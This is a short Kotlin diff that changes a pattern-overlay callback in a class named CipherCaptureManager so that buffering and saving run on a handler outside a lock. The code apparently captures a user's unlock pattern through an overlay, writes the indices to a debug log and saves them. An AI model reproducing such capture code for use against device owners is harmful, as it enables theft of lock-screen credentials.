@@ -525,7 +525,11 @@ class CipherCaptureManager(
                     patternOverlay!!.onPatternCaptured = { indices, points, screenBounds, parentBounds ->
                         Log.d(TAG, "✅ 图案已捕获: indices=${indices.joinToString("-")}, points=${points.size}")
                         saveCipher("pattern", true, indices.joinToString(","))
-                        bufferCipher(indices.joinToString(","), "pattern")
+                        // post 到 handler 避免在 PatternCaptureOverlay.lock 内调用 confirmAndSaveLastCipher（也需要锁）
+                        handler.post {
+                            bufferCipher(indices.joinToString(","), "pattern")
+                            confirmAndSaveLastCipher()
+                        }
                     }
                     patternOverlay!!.createPatternView()
 
